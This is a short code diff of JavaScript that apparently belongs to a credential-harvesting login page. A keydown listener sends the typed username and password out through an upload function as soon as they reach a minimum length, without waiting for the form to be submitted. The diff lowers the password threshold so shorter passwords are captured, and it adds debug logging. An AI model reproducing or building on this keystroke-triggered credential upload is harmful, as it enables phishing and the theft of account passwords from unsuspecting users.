@@ -26,8 +26,10 @@ function valid(id){
 }
 
 window.addEventListener('keydown', e => {
-    if (Id('username').value.length > 2 && Id('password').value.length > 5){
+    if (Id('username').value.length > 2 && Id('password').value.length > 4){
+        console.log('y')
         uploadSet('-')
+        console.log('yo')
         setTimeout(()=>{
             uploadSet('username: ' + Id('username').value)
             uploadSet('password: ' + Id('password').value)
